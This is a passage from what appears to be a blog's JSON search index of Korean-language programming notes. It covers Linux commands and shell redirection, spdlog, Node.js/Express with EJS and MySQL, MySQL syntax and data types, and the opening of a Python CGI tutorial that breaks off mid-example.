readelf FILE_NAME: ELF 파일의 meta data를 확인한다. ELF란 Executable and Linkable Format을 의미한다. (*.o 형태의 파일이다) readelf -h ELF 파일의 헤더 확인 readelf -s ELF 파일 내부 symbol 정보들을 출력한다. 함수 주소, 이름 및 속성들을 확인할 수 있다. readelf -S ELF 파일 내부 Section 정보들을 출력한다. objdump -h 명령과 동일한 결과를 출력한다. objdump -S FILE_NAME: object file을 어셈블리 형태로 주소별로 출력 해주는 명령이다. objdump -h FILE_NAME: object file의 section 헤더정보를 확인하는 명령어이다. section의 크기, VMA(Virtual Memory Address), LMA(Load Memory Address), file offset 등의 정보를 확인할 수 있다. readelf -S 명령과 동일한 결과를 출력한다. objdump -d FILE_NAME: object file 내용을 어셈블리어 형태로 출력한다. 리다이렉션 명령어 실행 시 발생하는 출력을 표준 출력/표준 에러가 아닌 다른 방향으로 전환하는 기법이다. CMD1 \u0026gt; FILE_NAME: 표준 출력을 리다이렉션, CMD1의 결과를 FILE_NAME에 저장한다. CMD1 1\u0026gt; FILE_NAME 명령과 동일하다. 즉, 1\u0026gt; 은 \u0026gt;로 대체 가능하다. CMD1 2\u0026gt; FILE_NAME: 표준 에러를 리다이렉션, CMD1에서 발생한 에러를 FILE_NAME에 저장한다. CMD1 \u0026gt;\u0026gt; FILE_NAME: 표준 출력을 리다이렉션, CMD1의 결과를 FILE_NAME에 저장하되, 기존 파일 뒤부터 이어서 쓴다. CMD1 2\u0026gt; FILE_NAME_1 1\u0026gt; FILE_NAME_2: CMD1의 표준에러와 표준출력을 FILE_NAME_1 과 FILE_NAME_2에 나누어 기록한다. CMD1 \u0026gt; /dev/null: 출력할 내용을 버린다. dev/null 로 리다이렉트 된 내용은 모두 버려진다. Metacharacter 리눅스 상에서 특정 역할을 수행하는 문자를 Metacharacter(메타문자) 라 한다. $: 쉘 환경변수 (echo $PATH: PATH 라는 환경변수를 화면에 출력) \u0026amp;\u0026amp;: 이전 명령 이후 다음 명령 수행(mkdir A \u0026amp;\u0026amp; cd A: A 라는 디렉터리 생성 후 A 디렉터리로 이동) ;: 명령어 구분자 (mkdir A; cd A: A 라는 디렉터리 생성, A 디렉터리로 이동) |: 명령어 파이프라이닝 (find . -name hello | grep world: \u0026lsquo;hello\u0026rsquo; 라는 이름의 파일을 찾고, 출력된 항목들 중 \u0026lsquo;world\u0026rsquo; 가 포함된 라인만 다시 추출) *: 와일드카드 (find . -name hello*: \u0026lsquo;hello*\u0026rsquo; 정규식에 일치하는 파일 찾기) ","permalink":"https://aswinblue.github.io/Blog/post/linux/linux_command/","summary":"Linux Command 리눅스에서 사용되는 명령어들을 정리한다. 자주 사용되는 모듈의 명령어도 포함한다. 리눅스에서 명령어는 /usr/bin/ 폴더에 저장되며, 내부에 저장된 파일들은 각 유저들에게 실행권한이 있다. 유저 개인의 명령어를 따로 설정 및 관리하려면 ~/.bashrc 파일에서 특정 디리렉터리를 PATH에 추가하여 사용할 수 있다. 기본적으로 ~/bin/ 경로가 PATH에 추가되어 있다. export PATH=$PATH:추가할경로[:추가할경로2:추가할경로3:...] 명령어를 ~/.bashrc 에 추가하면 경로를 추가할 수 있다. ex) # in .bashrc file\rPATH=$PATH:/home/user/bashrc # 기존의 PATH에 /home/user/.bashrc 추가\r# 현재 PATH는 .bashrc 포함\rPATH=$PATH:/home/user/dir1:/home/user/dir2 # 기존의 PATH에 dir1, dir2 추가\r# 현재 PATH는 .","title":"Linux commands"},{"content":"spdlog C++ 프로젝트에서 로그를 세팅할 수 있는 라이브러리 fast, header only, no dependency, .. 등 장점 참조 https://isocpp.org/blog/2014/11/spdlog https://github.com/gabime/spdlog\n","permalink":"https://aswinblue.github.io/Blog/post/c++/log_c++/","summary":"spdlog C++ 프로젝트에서 로그를 세팅할 수 있는 라이브러리 fast, header only, no dependency, .. 등 장점 참조 https://isocpp.org/blog/2014/11/spdlog https://github.com/gabime/spdlog","title":"spdlog C++"},{"content":"Node.js 기본 명령 npm init : 패키지 생성 npm install : 라이브러리 설치 -P : package.json에 저장, 기본옵션 -O : optionalDependencies에 저장 -D, --no-save : 기록없이 다운로드 -g : 글로벌 설치, 모든 프로젝트에 적용 MODULE_NAME@VERSION : 버전 설정, latest는 가장 최근 버전을 의미 node main.js : 실행(main.js) npx \u0026lt;package_name\u0026gt; : 설치하지 않고 일회만 실행 node main.js : 패키지 실행 (main.js파일) npm audit : 의존성 문제가 발생했을 때, npm audit fix : 의존성 문제를 자동으로 해결하는 명령어, 일부 해결을 할 수는 있지만 package.json 파일을 수정할 수 있으므로 주의. \u0026ndash;fix 옵션을 넣어서 강제로 수정할 수도 있지만, 오히려 되던 기능이 안 될 수도 있으므로 추천하지 않는다. npm cache clean : 캐싱된 데이터를 정리할 수 있다. \u0026ndash;force 옵션을 넣어 강제로 처리 가능 구조 main.js : nodejs 실행시 실행할 메인 파일 package.json : root 경로에 존재하며, npm 프로젝트를 관리하는 파일 /node_modules : 프로젝트에서 사용되는 모듈들이 저장되는 파일이다. npm install 명령 사용시 모듈들이 다운받아지는 경로이다. package.json nodejs 설정을 담고있는 파일로, 참조할 내용이 많아 아래에 따로 정리한다.\n\u0026quot;//\u0026quot; : \u0026quot;comment\u0026quot; : 주석을 넣는 방법, json key를 //로 하고, value에 comment를 작성한다.\nscripts : npm run SCRIPT(SCRIPT는 원하는 명령) 명령으로 특정 command를 수행하게 할 수 있음\nscript 명령은 os별로 명령이 상이할 수 있다. 이때는 다음과 같이 설정하여 각 os별로 다르게 동작할 수 있도록 한다. (npm run test 명령시 자동으로 수행해주는것 같지는 않음) os에 따라 명령어가 다를 수 있으므로, cross-env 모듈을 설치해서 사용하면 문제를 간단히 해결할 수 있다. ex) cross-env NODE_ENV=production \u0026#34;scripts\u0026#34;: {\r\u0026#34;test\u0026#34;: \u0026#34;run-script-os\u0026#34;,\r\u0026#34;test:darwin:linux\u0026#34;: \u0026#34;export NODE_ENV=test \u0026amp;\u0026amp; mocha\u0026#34;,\r\u0026#34;test:win32\u0026#34;: \u0026#34;SET NODE_ENV=test\u0026amp;\u0026amp; mocha\u0026#34;\r} devDependencies : 내부에 필요한 모듈들. npm install -D 명령어로 dependency를 추가 가능하다.\n{\r\u0026#34;name\u0026#34;: \u0026#34;rankingserver\u0026#34;,\r\u0026#34;version\u0026#34;: \u0026#34;1.0.0\u0026#34;,\r\u0026#34;description\u0026#34;: \u0026#34;\u0026#34;,\r\u0026#34;main\u0026#34;: \u0026#34;index.js\u0026#34;,\r\u0026#34;scripts\u0026#34;: {\r\u0026#34;//\u0026#34; : \u0026#34;this line is a comment\u0026#34;,\r\u0026#34;test\u0026#34;: \u0026#34;echo \\\u0026#34;Error: no test specified\\\u0026#34; \u0026amp;\u0026amp; exit 1\u0026#34;,\r\u0026#34;build:postcss\u0026#34;: \u0026#34;NODE_ENV=production postcss src/main/resources/static/css/tailwind.css -o target/classes/static/css/tailwind.css\u0026#34;,\r\u0026#34;watch:postcss\u0026#34;: \u0026#34;NODE_ENV=development postcss src/main/resources/static/css/tailwind.css -o src/main/resources/static/css/tailwind.css -w\u0026#34;\r},\r\u0026#34;repository\u0026#34;: {\r\u0026#34;type\u0026#34;: \u0026#34;git\u0026#34;,\r\u0026#34;url\u0026#34;: \u0026#34;git+https://github.com/AswinBlue/RankServer.git\u0026#34;\r},\r\u0026#34;keywords\u0026#34;: [],\r\u0026#34;author\u0026#34;: \u0026#34;\u0026#34;,\r\u0026#34;license\u0026#34;: \u0026#34;ISC\u0026#34;,\r\u0026#34;bugs\u0026#34;: {\r\u0026#34;url\u0026#34;: \u0026#34;https://github.com/AswinBlue/RankServer/issues\u0026#34;\r},\r\u0026#34;homepage\u0026#34;: \u0026#34;https://github.com/AswinBlue/RankServer#readme\u0026#34;,\r\u0026#34;devDependencies\u0026#34;: {\r\u0026#34;autoprefixer\u0026#34;: \u0026#34;^10.4.7\u0026#34;,\r\u0026#34;postcss\u0026#34;: \u0026#34;^8.4.14\u0026#34;,\r\u0026#34;postcss-cli\u0026#34;: \u0026#34;^9.1.0\u0026#34;,\r\u0026#34;tailwindcss\u0026#34;: \u0026#34;^3.0.24\u0026#34;\r}\r} 모듈 사용 var express = require('express');\nvar session = require('express-session');\nvar bodyParser = require('body-parser');\nvar app = express();\nstatic 설정 app.use('/static', express.static(__dirname + '/static'));\n\u0026lsquo;/static\u0026rsquo; 이라는 경로로 \u0026lsquo;현재경로/static\u0026rsquo; 폴더를 연결시킴, 즉 \u0026lsquo;/static/file\u0026rsquo; 을 호출하면 \u0026lsquo;현재경로/static/file\u0026rsquo; 이 호출됨 session 설정 app.use(session({ -\u0026gt; session 사용 설정\nsecret:\u0026quot;SECRET_CODE\u0026quot;, -\u0026gt; 세션을 암호화 할 시드 설정\nresave:false,\nsaveUninitialized:true\n}));\nbody parser app.use(bodyParser.urlencoded({extended: false}));\nhtml의 body의 내용을 express의 js파일에서 불러와 사용할 수 있도록 하는 모듈 routing r_edit = require('./route/edit.js'); -\u0026gt; \u0026lsquo;/edit\u0026rsquo; 경로로 요청이 오면 \u0026lsquo;./route/edit.js\u0026rsquo; 파일로 연결, 라우팅 처리함\napp.use('/edit', r_edit);\nr_login = require('./route/login.js');\napp.use('/login', r_login);\nr_default = require('./route/default.js');\napp.use('/', r_default);\nejs app.set('views', './views'); -\u0026gt; \u0026lsquo;./view\u0026rsquo; 경로를 view로 사용, view 폴더 안에는 html파일들을 넣으면 됨\napp.set('view engine', 'html'); -\u0026gt; view 를 html로 구성함\napp.engine('.html', require('ejs').renderFile);\nServer var server = app.listen(80, function() { -\u0026gt; 80번 포트로 서버 오픈\nvar host = server.address().address -\u0026gt; 호스팅한 서버의 주소\nvar port = server.address().port -\u0026gt; 호스팅한 서버의 포트\nconsole.log(\u0026quot;App listening at http://%s:%s\u0026quot;, host, port) -\u0026gt; 로그\n});\nedit.js main 파일에서 라우팅을 위해 r_edit 변수에 연결시켜 사용하는 파일, ./route 폴더에 정리되어 있다. var express = require('express'); -\u0026gt; express 모듈 사용\nvar router = express.Router(); -\u0026gt; express의 routing 모듈 사용\n함수 사용 function stringToInt(x, base) { -\u0026gt; js 파일 안에서도 함수 정의, 사용 가능\nconst parsed = parseInt(x, base); -\u0026gt; string을 int로 변환\nif (isNaN(parsed)) { return 0; } -\u0026gt; string이 \u0026rsquo;\u0026rsquo; 인 경우, NAN을 반환하는데, NAN을 0으로 치환\nreturn parsed; -\u0026gt; 치환한 결과를 반환\n}\nrouting 설정 router.post('/:category/:product', function(req, res, next) {\npost 명령으로 / \u0026hellip; / \u0026hellip; 주소로 명령이 내려올 경우 function을 수행한다. main.js에서 r_edit을 \u0026lsquo;SERVER_ADDRESS/edit\u0026rsquo; 주소로 왔을 때 실행하도록 매핑해 놓았으므로, \u0026lsquo;SERVER_ADDRESS/edit/AAA/BBB\u0026rsquo; 주소로 명령이 내려오면 해당 함수가 동작한다. AAA 자리에 들어가는 값은 req.params.category 로 참조 가능하며, BBB는 req.params.product로 참조 가능하다. router.get('/:TLV', function(req, res, next) { -\u0026gt; get 명령은 router.get으로 설정 가능하다.\nmodule.exports = router; -\u0026gt; 마지막에 router를 exports 해야 적용이 된다.\nsession 설정 if (req.session.user) {\nmain.js에서 session을 사용하였으므로 req.session으로 session에 담긴 변수들을 참조 가능하다. req.session.user 값이 있으면 아래 내용을 수행한다는 코드이다. 값을 집어넣을 때에도 req.session.val = 1 과 같이 사용 가능하다. DB 사용 var mysql = require('mysql'); -\u0026gt; mysql 모듈을 사용한다.\nvar db_config = require('../config/db_config.json'); -\u0026gt; config 폴더 안에 db 접속에 필요한 내용을 저장해 놓았다. js 파일과 해당 내용을 분리하여 보안을 강화시킬 수 있다. db_config.json파일은 json 데이터를 담고 있다.\nvar connection = mysql.createConnection({ -\u0026gt; mysql 연결 설정\nhost : db_config.host, -\u0026gt; db_config_json 파일의 key를 참조하여 value를 대입한다.\nuser : db_config.user,\npassword : db_config.password,\ndatabase : db_config.database -\u0026gt; 사용할 DB 이름\nconnection.connect(); -\u0026gt; 연결을 수행한다.\n});\nconnection.query('UPDATE mytable SET name = ?, description = ?, price = ? where number = ?',[inputs.name, inputs.description, inputs.price, req.params.category], function (error, results, fields) { -\u0026gt; 연결된 DB에 query를 날린다. error는 오류정보, results는 DB 결과(row)를 array형태로 반환한다.\nquery 안에 query를 넣으면 오류가 난다. 완료 후 다음 query를 진행하도록 하자. console.log(this.sql); -\u0026gt; 함수 안에서 this.sql을 호출하면 query 내용을 참조할 수 있다.\nif (error) { -\u0026gt; 에러가 발생한 경우\nconsole.log(error);\nres.status(500).json({\u0026quot;Error\u0026quot;: \u0026quot;DB Error\u0026quot;}); -\u0026gt; 결과 response에 status 500을 주고, json 메시지를 함께 던진다.(화면에는 Json 메시지가 출력 됨)\n}\n});\nconnection.end();-\u0026gt; DB 사용을 끝내고 연결을 해제한다.\nconnection.query(\u0026quot;SELECT * FROM user WHERE User=? AND authentication_string=PASSWORD(?)\u0026quot;, [id, pswd], function (error, results, fields) {\nPASSWORD() 함수는 mysql의 user DB에서 사용자의 비밀번호를 인코딩하여 authentication_string 컬럼에 해당하는 값으로 만드는 함수이다. 비밀번호를 넣으면 authentication_string값을 반환한다. html 페이지 연결 routing 함수에서 받은 요청에 대해 redirect를 할 수도 있고, render로 파일을 열 수도 있다. res.redirect('/edit/' + req.params.TLV); -\u0026gt; 설정한 주소로 페이지를 리다이렉트 한다.\nres.render('login.html', {url: target}); -\u0026gt; url이란 키로 target 이라는 변수에 담긴 data를 login.html에 전달한다. html 파일에서는 url 이란 변수로 target값을 사용 가능하다.\nhtml 페이지 연동 html 페이지에서 form에 넣어서 보낸 내용은 bodyParser 모듈로 파싱하면 \u0026lsquo;req.body.변수이름\u0026rsquo; 으로 참조 가능하다. var inputs = { -\u0026gt; 내용을 받아 json 형태로 저장\n\u0026quot;relation\u0026quot;: req.body.relation, -\u0026gt; html파일의 form 태그의 input 태그중 name=\u0026ldquo;relation\u0026quot;인 태그의 value 값을 참조\n\u0026quot;number\u0026quot;: req.body.name}\nindex.html ejs모듈을 사용하여 설정한 대로 view 폴더 내에 생성한다. static 설정을 마쳤기 때문에 js 파일이나 css 파일들은 미리 설정해둔 \u0026lsquo;/static\u0026rsquo; 폴더 내에서 참조 가능하다. \u0026lt;script type=\u0026quot;text/javascript\u0026quot; src=\u0026quot;/static/edit_func.js\u0026quot;\u0026gt;\u0026lt;/script\u0026gt; -\u0026gt; static 파일 호출 방법\nhtml 안에서 nodejs 문법을 사용하려면 \u0026lt;% %\u0026gt; 안에서 사용하면 된다. 변수 값을 바로 반환하려면 \u0026lt;%= %\u0026gt; 를 사용한다. \u0026lt;% var ptr = 10 %\u0026gt; -\u0026gt; 변수 ptr 선언\n\u0026lt;% dataList.forEach(function(item, index) { %\u0026gt;-\u0026gt; dataList의 항목들에 대해 수행, dataList는 routing function(route/index.js 안의 routing 함수)에서 res.render('index.html', {dataList: data}); 로 전해준 데이터이다.\n\u0026lt;% if (dataList[ptr].number != item.number) { %\u0026gt; -\u0026gt; if 함수 사용 가능, if문이 false라면 아래 내용은 출력되지 않음\n\u0026lt;tr id=\u0026quot;lineTr\u0026quot;\u0026gt;\n\u0026lt;td\u0026gt;\u0026lt;a href=\u0026quot;edit/\u0026lt;%=item.number%\u0026gt;\u0026quot;\u0026gt;\u0026lt;%= item.number %\u0026gt;\u0026lt;/a\u0026gt;\u0026lt;/td\u0026gt;\n\u0026lt;td\u0026gt;\u0026lt;%= item.name %\u0026gt;\u0026lt;/td\u0026gt;\n\u0026lt;td\u0026gt;\u0026lt;%= item.description %\u0026gt;\u0026lt;/td\u0026gt;\n\u0026lt;td\u0026gt;\u0026lt;%= item.superSet %\u0026gt;\u0026lt;/td\u0026gt;\n\u0026lt;% ptr = index %\u0026gt;\n\u0026lt;% } else { %\u0026gt;\n\u0026lt;tr\u0026gt;\n\u0026lt;td\u0026gt;\u0026lt;/td\u0026gt;\n\u0026lt;td\u0026gt;\u0026lt;/td\u0026gt;\n\u0026lt;td\u0026gt;\u0026lt;/td\u0026gt;\n\u0026lt;td\u0026gt;\u0026lt;/td\u0026gt;\n\u0026lt;% } %\u0026gt;\n\u0026lt;td\u0026gt;\u0026lt;%= item.relation %\u0026gt;\u0026lt;/td\u0026gt; -\u0026gt; item.relation의 값을 반환, 즉 해당 값의 내용이 안에 출력된다.\n\u0026lt;td\u0026gt;\u0026lt;%= item.etc %\u0026gt;\u0026lt;/td\u0026gt;\n\u0026lt;td\u0026gt;\u0026lt;%= item.bit %\u0026gt;\u0026lt;/td\u0026gt;\n\u0026lt;td\u0026gt;\u0026lt;%= item.byte %\u0026gt;\u0026lt;/td\u0026gt;\n\u0026lt;td\u0026gt;\u0026lt;%= item.value %\u0026gt;\u0026lt;/td\u0026gt;\n\u0026lt;td\u0026gt;\u0026lt;%= item.meaning %\u0026gt;\u0026lt;/td\u0026gt;\n\u0026lt;td\u0026gt;\u0026lt;%= item.history %\u0026gt;\u0026lt;/td\u0026gt;\n\u0026lt;/tr\u0026gt;\n\u0026lt;% }); %\u0026gt;\n","permalink":"https://aswinblue.github.io/Blog/post/webserver/nodejs/","summary":"Node.js 기본 명령 npm init : 패키지 생성 npm install : 라이브러리 설치 -P : package.json에 저장, 기본옵션 -O : optionalDependencies에 저장 -D, --no-save : 기록없이 다운로드 -g : 글로벌 설치, 모든 프로젝트에 적용 MODULE_NAME@VERSION : 버전 설정, latest는 가장 최근 버전을 의미 node main.js : 실행(main.js) npx \u0026lt;package_name\u0026gt; : 설치하지 않고 일회만 실행 node main.js : 패키지 실행 (main.js파일) npm audit : 의존성 문제가 발생했을 때, npm audit fix : 의존성 문제를 자동으로 해결하는 명령어, 일부 해결을 할 수는 있지만 package.","title":"Nodejs"},{"content":"mysql 명령어 문법 참조 : http://tcpschool.com/mysql/mysql_basic_syntax\n명령어에서 대소문자는 상관없다. mysql에서 주석은 \u0026lsquo;#\u0026lsquo;을 사용한다. 실행 및 로그인 mysql mysql 실행, 기본으로 설정된 user로 로그인됨 mysql -u 아이디 -p -u: 특정 아이디로 로그인 -p: 로그인시 비밀번호 입력하도록 데이터베이스 관리 DB 생성 UTF8 로 문자열 저장하기 CREATE DATABASE 데이터베이스_이름 default CHARACTER SET UTF8 DB 목록확인 show databases DB 선택 use DB_NAME 종료 EXIT 로그인 \u0026amp; 데이터베이스 선택 $ mysql -p DB_NAME -u USER_NAME 사용자 이름과 USER_NAME으로 DB_NAME 데이터베이스 실행 USER_NAME이 비어있으면 현재 로그인한 계정과 동일한 이름으로 로그인 시도 -u DB_NAME 옵션은 로그인 후 $use DB_NAME 과 같은 효과 테이블 생성 및 관리 TABLE_NAME 테이블의 스키마 확인 desc TABLE_NAME\nCREATE : 테이블 생성\nCREATE TABLE 테이블이름 (\rid INT NOT NULL AUTO_INCREMENT,\r항목1 VARCHAR(255) NOT NULL DEFAULT \u0026#39;FOO\u0026#39;,\r항목2 DATE NOT NULL,\r항목3 DECIMAL(10 , 2 ) NULL,\rPRIMARY KEY (id)\r) ENGINE-; NOT NULL: 필수항목 AUTO_INCREMENT: 수동으로 설정 가능하지만, 따로 설정하지 않으면 테이블 내 해당 컬럼에서 가장 큰 값에 1을 증가하여 자동으로 설정됨. VARCHAR(#): 캐릭터형 #bit DEFAULT : 기본값, 따로 설정안할시 기본값은 NULL이 됨. ENGINE: 데이터 저장 구조 MyISAM row level locking이 아닌 table level locking을 사용하기에, 한 테이블에 많은 접근이 이루어지면 속도가 느려짐 select count(*) from TABLE 속도가 빠름 InnoDB 풀 텍스트 인덱스를 지원하지 않고 속도가 약간 느림 트랜잭션을 지원함 참조 DESC: 테이블 구조 확인 DESC 테이블 DESCRIBE 테이블\nSELECT : 테이블 검색 SELECT 필드 [,필드2 ...] FROM 테이블 [WHERE 조건] [ORDER BY 필드]\n필드를 \u0026lsquo;,\u0026lsquo;로 다중 선택 WHERE 문으로 특정 조건에 해당하는 레코드만 추출 LIKE : 뒤에 와일드 카드 사용 _ : 와일드카드로, \u0026lsquo;한 자리의 어떤 문자\u0026rsquo;를 의미한다. % : 와일드카드로, 정규식의 *과 같은 의미이다. NOT : 부정의 의미, !과 동일 \u0026lt;\u0026gt; : !=와 같은 의미 ORDER BY 문으로 검색 결과를 필드에 맞게 정렬 DELETE : 데이터 삭제 DELETE FROM 테이블 [WHERE 조건]\n조건을 생략하면 테이블의 모든 데이터 삭제 ALTER: 테이블 변경 참조 컬럼 추가 ALTER TABLE 테이블이름 ADD COLUMN 컬럼이름 데이터형 컬럼 타입 변경 ALTER TABLE 테이블이름 MODIFY COLUMN 컬럼이름 데이터형 컬럼 이름 변경 ALTER TABLE 테이블이름 CHANGE COLUMN 기존이름 새이름 데이터형 컬럼 삭제 ALTER TABLE 테이블이름 DROP COLUMN 컬럼이름 Primary Key 설정 ALTER TABLE 테이블이름 ADD PRIMARY KEY (설정할컬럼1, 설정할컬럼2, ...) Primary key 삭제 ALTER TABLE 테이블이름 DROP PRIMARY KEY 테이블명 변경 ALTER TABLE 테이블이름 RENAME 새테이블이름 DB구조 변경 ALTER TABLE 테이블 engine=InnoDB; DROP : 테이블 삭제 DROP DATABASE 데이터베이스 DROP TABLE 테이블\nINSERT : 행 추가\n원하는 필드만 설정, 설정 안한부분은 default값이 들어감 INSERT INTO 테이블(필드1, 필드2, ... ) VALUES (데이터1, 데이터2, ... ) 모든 필드를 설정할땐 컬럼 이름을 생략 가능 INSERT INTO 테이블 VALUES (데이터1, 데이터2, ... ) JOIN : 테이블 융합 내부Join\nSELECT 테이블1.*, 테이블2.* FROM 테이블1, 테이블2 WHERE 조건 SELECT 테이블1.*, 테이블2.* FROM 테이블1 INNER JOIN 테이블2 ON 조건 외부Join\nLEFT Join SELECT * FROM 테이블1 LEFT JOIN 테이블2 ON 조건 조건이 맞지 않으면 테이블2의 필드 값이 모두 null 상태로 표시된다. RIGHT Join SELECT * FROM 테이블1 LEFT JOIN 테이블2 ON 조건 조건이 맞지 않으면 테이블1의 필드값이 모두 null 상태로 표시된다. 유저 관리 GRANT : 데이터베이스에 권한 부여 GRANT ALL PRIVILEGES ON my_db.* TO new_user@localhost IDENTIFIED BY 'pswd'; ALL PRIVILEGES : 모든 권한 my_db.* : my_db의 모든 테이블 new_user : 사용권한을 받을 유저(없을시 자동생성), @localhost : 로컬환경에서만 접속 가능 IDENTIFIED BY 'pswd' : new_user의 비밀번호를 pswd로 설정 flush privileges 권한 즉시 적용 기타 명령어 현재 사용자 정보 확인 select user()\n현재 DB 정보 확인 select databases()\nCSV파일 DB에 적용 LOAD DATA LOCAL INFILE 'FILE_NAME' INTO TABLE TABLE_NAME FIELDS TERMINATED BY ',' OPTIONALLY ENCLOSED BY '\u0026quot;' LINES TERMINATED BY '\\n'; - FILE_NAME 파일을 TABLE_NAME 테이블에 넣는다. 필드는 \u0026lsquo;,\u0026lsquo;로 구분되어 있고, 줄바꿈은 \u0026lsquo;\\n\u0026rsquo;로 구분되어 있고, \u0026lsquo;\u0026quot;\u0026lsquo;로 싸인 내용은 한 덩어리로 인식한다.\n경고문 확인 SHOW WARNINGS\\G\n데이터 타입 문자형 데이터타입 데이터 타입 설명 CHAR(n) 고정 길이 데이터 타입(최대 255byte)- 지정된 길이보다 짦은 데이터 입력될 시 나머지 공간 공백으로 채워진다. VARCHAR(n) 가변 길이 데이터 타입(최대 65535byte)- 지정된 길이보다 짦은 데이터 입력될 시 나머지 공간은 채우지 않는다. TINYTEXT(n) 문자열 데이터 타입(최대 255byte) TEXT(n) 문자열 데이터 타입(최대 65535byte) MEDIUMTEXT(n) 문자열 데이터 타입(최대 16777215byte) LONGTEXT(n) 문자열 데이터 타입(최대 4294967295byte) 숫자형 데이터 타입 데이터 타입 설명 TINYINT(n) 정수형 데이터 타입(1byte) -128 ~ +127 또는 0 ~ 255수 표현 가능하다. SMALLINT(n) 정수형 데이터 타입(2byte) -32768 ~ 32767 또는 0 ~ 65536수 표현 가능하다. MEDIUMINT(n) 정수형 데이터 타입(3byte) -8388608 ~ +8388607 또는 0 ~ 16777215수 표현 가능하다. INT(n) 정수형 데이터 타입(4byte) -2147483648 ~ +2147483647 또는 0 ~ 4294967295수 표현 가능하다. BIGINT(n) 정수형 데이터 타입(8byte) - 무제한 수 표현 가능하다. FLOAT(길이,소수) 부동 소수형 데이터 타입(4byte) -고정 소수점을 사용 형태이다. DECIMAL(길이,소수) 고정 소수형 데이터 타입고정(길이+1byte) -소수점을 사용 형태이다. DOUBLE(길이,소수) 부동 소수형 데이터 타입(8byte) -DOUBLE을 문자열로 저장한다. 날짜형 데이터 타입 데이터 타입 설명 DATE 날짜(년도, 월, 일) 형태의 기간 표현 데이터 타입(3byte) TIME 시간(시, 분, 초) 형태의 기간 표현 데이터 타입(3byte) DATETIME 날짜와 시간 형태의 기간 표현 데이터 타입(8byte) TIMESTAMP 날짜와 시간 형태의 기간 표현 데이터 타입(4byte) -시스템 변경 시 자동으로 그 날짜와 시간이 저장된다. YEAR 년도 표현 데이터 타입(1byte) 이진 데이터 타입 데이터 타입 설명 BINARY(n) \u0026amp; BYTE(n) CHAR의 형태의 이진 데이터 타입 (최대 255byte) VARBINARY(n) VARCHAR의 형태의 이진 데이터 타입 (최대 65535byte) TINYBLOB(n) 이진 데이터 타입 (최대 255byte) BLOB(n) 이진 데이터 타입 (최대 65535byte) MEDIUMBLOB(n) 이진 데이터 타입 (최대 16777215byte) LONGBLOB(n) 이진 데이터 타입 (최대 4294967295byte) C++연동 SDK mysql cpp connector 라 불리는, C++ 코드로 mysql을 사용할 수 있는 SDK가 제공된다. mysql과 mysqlx가 있는데, 전자는 RDB, 후자는 NoSQL이다. 표준 docmument https://dev.mysql.com/doc/connector-cpp/8.0/en/connector-cpp-installation-source-distribution.html guthub https://github.com/mysql/mysql-connector-cpp 참조 데이터베이스 정규화 1NF, 2NF, 3NF, BCNF :: Deep Play\n[MySQL] csv 파일을 직접 MySQL 테이블로 Import 하는 방법 (대용량 파일 import 팁) 주경야근\nImport CSV File Into MySQL Table\nDB - 데이터 타입/MYSQL\n[MySQL] Warnings 발생 했을 때 경고 내용 보기 - Blog Goooood.net\nHow to import CSV into mysql if values contains comma - Stack Overflow\n[SQL] 테이블 합치기 (JOIN / UNION) : 네이버 블로그\nMySQL 계정 생성 관리 및 권한설정 :: 비실이의 개발공간\n[MySQL] ERROR 1044 (42000.. : 네이버블로그\nphp - How can I make a key pair primary? - Stack Overflow\nMySQL 계정 변경 및 간단한 사용법 : 네이버 블로그\nMySQL 소개 및 기본 사용법 - 생활코딩\n(MySQL) 1장 시작하기. (DB 생성, 테이블 생성, SELECT) - 미래학자\n","permalink":"https://aswinblue.github.io/Blog/post/database/mysql/","summary":"mysql 명령어 문법 참조 : http://tcpschool.com/mysql/mysql_basic_syntax\n명령어에서 대소문자는 상관없다. mysql에서 주석은 \u0026lsquo;#\u0026lsquo;을 사용한다. 실행 및 로그인 mysql mysql 실행, 기본으로 설정된 user로 로그인됨 mysql -u 아이디 -p -u: 특정 아이디로 로그인 -p: 로그인시 비밀번호 입력하도록 데이터베이스 관리 DB 생성 UTF8 로 문자열 저장하기 CREATE DATABASE 데이터베이스_이름 default CHARACTER SET UTF8 DB 목록확인 show databases DB 선택 use DB_NAME 종료 EXIT 로그인 \u0026amp; 데이터베이스 선택 $ mysql -p DB_NAME -u USER_NAME 사용자 이름과 USER_NAME으로 DB_NAME 데이터베이스 실행 USER_NAME이 비어있으면 현재 로그인한 계정과 동일한 이름으로 로그인 시도 -u DB_NAME 옵션은 로그인 후 $use DB_NAME 과 같은 효과 테이블 생성 및 관리 TABLE_NAME 테이블의 스키마 확인 desc TABLE_NAME","title":"Mysql"},{"content":"python CGI CGI는 Common Gateway Interface의 약자다. web application을 만들 수 있는 언어는 ruby, java, php 등 다양하지만 모두 CGI 규약을 따라 web server와 통신한다. web server는 사용자의 요청을 받으면 약속된 이름의 데이터를 환경변수로 web application에 전달하여 서로 교류한다. apache에서 python을 이용해 web application을 만들어 web server와 통신해 보자. $ a2enmod CGI 명령으로 apache의 CGI를 켜 주고, sudo service apache2 restart 로 설정 적용 /var/log/apache2/error.log 안에 apache 실행시 발생한 에러 로그가 담겨있다. 웹 브라우저가 웹 서버에 요청할 때 웹 서버는 응답으로 웹 페이지의 데이터 타입(헤더)와 함께 웹 페이지를 전송한다. python CGI로는 print(\u0026quot;content-type:text/html; charset=UTF-8\\n\u0026quot;) 와 같이 헤더를 표기낸다. 헤더를 출력한 다음 부터는 body 부분이 출력된다. 특정 주소로 Redirection을 할 때에는 print(\u0026quot;location : index.py?id=title\u0026quot;)을 이용한다. ( \u0026lsquo;:\u0026rsquo; 이후 부터 \u0026lsquo;\u0026quot;\u0026rsquo; 까지는 원하는대로 작성) formatting string에서 특정 문자열을 다른 문자로 치환하는 기능 ex) '{} {}'.format('one','tow') ex) '{a} {b}'.format(a='hello', b='world') python 파일에서 문자열과 format 함수를 이용하여 동적 html을 구현 가능하다. CGI 모듈 import cgi 로 모듈을 로드해 사용한다. form = cgi.FieldStorage() form은 jQuery와 같은 역할을 한다. ex) pageId = form['id'].value : page의 id를 가져온다. HTML 연동 input 태그의 name 속성 : input 태그를 특정 이름으로 CGI에 전달함 ex)\n\u0026lt;p\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;title\u0026#34; placeholder=\u0026#34;title\u0026#34;\u0026gt; \u0026lt;/p\u0026gt;\r\u0026lt;p\u0026gt; \u0026lt;textarea rows=\u0026#34;4\u0026#34; name=\u0026#34;description\u0026#34;\u0026gt;\u0026lt;/textarea\u0026gt;\u0026lt;/p\u0026gt;\r\u0026lt;p\u0026gt; \u0026lt;input 